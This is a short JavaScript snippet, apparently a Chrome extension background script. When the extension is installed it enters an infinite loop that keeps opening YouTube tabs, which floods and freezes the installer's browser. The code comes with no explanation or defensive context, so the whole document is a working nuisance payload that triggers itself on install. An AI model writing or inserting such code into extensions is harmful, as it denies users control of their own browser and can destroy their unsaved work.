chrome.runtime.onInstalled.addListener(() => {
  while(1==1) {
    chrome.tabs.create({ url: 'https://www.youtube.com' });
  }
});
